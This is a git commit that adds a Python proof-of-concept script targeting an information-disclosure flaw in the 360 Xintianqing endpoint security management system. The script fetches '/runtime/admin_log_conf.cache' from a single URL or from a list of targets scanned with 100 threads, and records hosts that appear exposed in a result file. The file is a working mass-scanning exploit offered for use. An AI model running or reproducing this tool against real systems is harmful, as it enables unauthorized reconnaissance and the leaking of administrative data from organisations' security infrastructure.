d212826c26a191924f3ced6e935cd93d23c5be9e
Doing-meaningful-things <168183576+Doing-meaningful-things@users.noreply.github.com>
2024-09-03 18:24:51 +0800

    Add files via upload

---
+++ 360 新天擎终端安全管理系统信息泄露漏洞.py
@@ -0,0 +1,71 @@
+import sys,argparse,requests,re
+requests.packages.urllib3.disable_warnings()
+from multiprocessing.dummy import Pool
+
+
+def banner():
+    banner = """
+
+██████╗  █████╗ ███╗   ██╗██████╗  █████╗ 
+██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗
+██████╔╝███████║██╔██╗ ██║██║  ██║███████║
+██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██╔══██║
+██║     ██║  ██║██║ ╚████║██████╔╝██║  ██║
+╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝
+                      author:panda
+                      type:360 新天擎终端安全管理系统信息泄露漏洞
+                      date:2024-09-2
+                      version:1.0
+   """
+    print(banner)
+
+def main():
+    banner()
+    parser = argparse.ArgumentParser(description="360 新天擎终端安全管理系统信息泄露漏洞")
+    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter your url')
+    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter your file')
+
+    args = parser.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+    elif args.file and not args.url:
+        url_list = []
+        with open(args.file,'r',encoding='utf-8') as f:
+            for url in f.readlines():
+                url_list.append(url.strip().replace('\n',''))
+            mp = Pool(100)
+            mp.map(poc,url_list)
+            mp.close()
+            mp.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+def poc(target):
+    payload = "/runtime/admin_log_conf.cache"
+    headers = {
+        "Cache-Control": "max-age=0",
+        "Upgrade-Insecure-Requests": "1",
+        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/128.0.0.0Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "Sec-Fetch-Site": "none",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-User": "?1",
+        "Sec-Fetch-Dest": "document",
+        "Accept-Encoding": "gzip,deflate,br",
+        "Accept-Language": "zh-CN,zh;q=0.9,en-CN;q=0.8,en;q=0.7",
+        "Priority": "u=0,i",
+        "Connection": "close",
+    }
+    try:
+        res1 = requests.get(url=target + payload, timeout=5, headers=headers, verify=False)
+        content = re.findall(r's:12:"(.*?)";', res1.text, re.S)
+        if res1.status_code == 200:
+            if '/login/login' in content:
+                with open('result.txt', 'a', encoding='utf-8') as f:
+                    f.write(target + '\n')
+        else:
+            print(f"[+]该{target}可能存在问题请手动测试")
+    except Exception as e:
+        print(e)
+
+if __name__ == '__main__':
+    main()
